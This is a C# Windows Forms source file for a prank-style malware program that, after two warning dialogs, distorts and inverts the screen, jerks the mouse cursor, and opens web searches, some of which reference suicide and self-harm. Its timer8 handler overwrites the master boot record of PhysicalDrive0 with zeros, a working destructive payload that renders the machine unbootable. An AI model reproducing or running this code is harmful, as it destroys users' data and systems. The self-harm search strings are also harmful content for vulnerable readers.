using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Drogen
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        const uint GENERIC_WRITE = 0x40000000;
        const uint OPEN_EXISTING = 3;
        private Random r;
        private Icon icon;
        private Graphics g;
        private Image bmp;
        private int true_num;
        private int direction;
        private int mouseCount;
        private int alpha;

        public Form1()
        {
            InitializeComponent();
            DialogResult startResult = MessageBox.Show("this malware countains malware are you sure you want to run it?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (startResult == DialogResult.Yes)
            {
                // Show the confirmation message
                DialogResult confirmResult = MessageBox.Show("THIS IS THE LAST WARNING IF YOU CLICK YES THEN YOU WILL GET A LARGE DAMAGE AND YOU HAVE TO REINSTALL IT. STILL RUN IT?", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (confirmResult == DialogResult.Yes)
                {
                    // Action to be taken if the user confirms

                    timer1.Start();
                    timer2.Start();
                    timer3.Start();
                    timer4.Start();
                    timer5.Start();
                    timer6.Start();
                    timer7.Start();
                    timer8.Start();

                    MessageBox.Show("Error: File corrupted! This program has been manipulated and maybe its infected by a Virus or cracked. This file wont work anymore.", "KilldataFuck.exe", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    // Action to be taken if the user cancels
                    MessageBox.Show("ok im quitting lol.", "...", MessageBoxButtons.OK, MessageBoxIcon.Question);

                }
            }
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            timer7.Start();
            Point currentPos = Cursor.Position; Cursor.Position = new Point(currentPos.X + 10, currentPos.Y);
            direction = (direction + 1) % 4;
            for (int i = 0; i < mouseCount; i++)
                using (Brush brush = new SolidBrush(Color.FromArgb(alpha, Color.OrangeRed)))

                    Cursor.Position = new Point(currentPos.X + 10, currentPos.Y); Cursor.Position = new Point(currentPos.X - 10, currentPos.Y); Cursor.Position = new Point(currentPos.X, currentPos.Y - 10); Cursor.Position = new Point(currentPos.X, currentPos.Y + 20);
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            timer6.Start();
            //make random num 1-5



            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.co.ck/search?q=how+to+die+in+real+life&sca_esv=5c33b0bec17714d5&sxsrf=AHTn8zopRYFaix-nCFQCI-zrEGbzvvGMpQ%3A1739915979072&source=hp&ei=ywK1Z4DsAefz0PEPzInqqQ8&iflsig=ACkRmUkAAAAAZ7UQ2-ptWWYeSJG05bhn8MOOgTxW6u74&ved=0ahUKEwjA_fmOnM6LAxXnOTQIHcyEOvUQ4dUDCBk&uact=5&oq=how+to+die+in+real+life&gs_lp=Egdnd3Mtd2l6Ihdob3cgdG8gZGllIGluIHJlYWwgbGlmZUjnI1AAWKIhcAB4AJABAZgB_wGgAbQOqgEGMjEuMC4yuAEDyAEA-AEBmAIOoALWCMICDhAuGIAEGLEDGNEDGMcBwgILEC4YgAQY0QMYxwHCAgsQABiABBixAxiDAcICERAuGIAEGLEDGNEDGIMBGMcBwgIFEAAYgATCAg4QABiABBixAxiDARiKBcICCBAAGIAEGLEDwgIIEC4YgAQY1ALCAg4QLhiABBixAxiDARjUAsICCxAuGIAEGLEDGIMBwgIFEC4YgATCAgcQABiABBgKwgIGEAAYFhgemAMAkgcGMTIuMS4xoAeAnQE&sclient=gws-wiz&sei=2gK1Z9OKEcSj5NoPsszkiQk");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.co.ck/search?q=fucko+bozo+memes&sca_esv=5c33b0bec17714d5&udm=2&biw=1272&bih=594&ei=KQO1Z_-_IfOm5NoPk-zI8A8&ved=0ahUKEwi_-IK8nM6LAxVzE1kFHRM2Ev4Q4dUDCBE&uact=5&oq=fucko+bozo+memes&gs_lp=EgNpbWciEGZ1Y2tvIGJvem8gbWVtZXNIpwlQigJYrQhwAXgAkAEAmAFloAHIAqoBAzUuMbgBA8gBAPgBAZgCAKACAJgDAIgGAZIHAKAHjgI&sclient=img");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03p6_nh5gjKk_7WWWGDr0qYtnieXg%3A1605092222038&ei=fsOrX5rzAY63kwWYq56IDg&q=my+mum+is+gay&oq=my+mum+is+gay&gs_lcp=CgZwc3ktYWIQAzIKCAAQFhAKEB4QEzIKCAAQFhAKEB4QEzoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgUIABCxAzoCCAA6CAgAELEDEIMBOgIILjoECAAQQzoHCC4QsQMQQzoECC4QQzoFCC4QsQM6CAguELEDEIMBOgUILhCTAjoECC4QCjoECAAQCjoFCC4QywE6BQgAEMsBOggILhDLARCTAjoGCAAQFhAeOggIABAWEAoQHlD_GliuO2D3PGgCcAB4AIABiwKIAeAOkgEGMS4xMi4xmAEAoAEBqgEHZ3dzLXdperABCsABAQ&sclient=psy-ab&ved=0ahUKEwiaque9qvrsAhWO26QKHZiVB-EQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=dancing+cow&sxsrf=ALeKk03Rx29J4Nduy2BetYRf6PUHNs9I8A:1605092295881&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiupoLhqvrsAhUdJcUKHdqKANwQ_AUoAXoECAcQAw&biw=1920&bih=937");
            }
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            timer5.Start();

            //this payload make glitchs on your screen :)
            var endWidth = 500;
            var endHeight = 500;

            var scaleFactor = 1; //perhaps get this value from a const, or an on screen slider

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap(startWidth, startHeight);

            g = this.CreateGraphics();
            g = Graphics.FromImage(bmp);

            var xPos = Math.Min(3, MousePosition.X - (startWidth / 500)); // divide by two in order to center
            var yPos = Math.Min(7, MousePosition.Y - (startHeight / 500));
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            // after this it will glitch your screen (:
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            int T = Screen.PrimaryScreen.Bounds.Top;
            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
            timer4.Start();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            int R = Screen.PrimaryScreen.Bounds.Bottom;
            IntPtr Brush = CreateSoildBrush(hdc);
            byte[] data = new byte[4];
            timer3.Start();
        }

        private IntPtr CreateSoildBrush(IntPtr hdc)
        {
            throw new NotImplementedException();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;


            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
            timer2.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            r = new Random();
            if (timer1.Interval > 101)
            {
                timer1.Interval -= 100;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;

                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if (timer1.Interval > 51)
            {
                timer1.Interval -= 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr holdbit = GetDesktopWindow();
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                alphaBlend(hdc, x, y);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

            }
            timer1.Start();
        }

        private void alphaBlend(IntPtr hdc, int x, int y)
        {

        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            IntPtr hDisk = CreateFile(@"\\.\PhysicalDrive0", GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (hDisk != IntPtr.Zero)
            {
                byte[] mbrData = new byte[512]; // Replace this with your MBR data (be cautious)
                uint bytesWritten;
                if (WriteFile(hDisk, mbrData, (uint)mbrData.Length, out bytesWritten, IntPtr.Zero))
                {
                    MessageBox.Show("you are not accessed to install this software (0)", "Server", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
    


  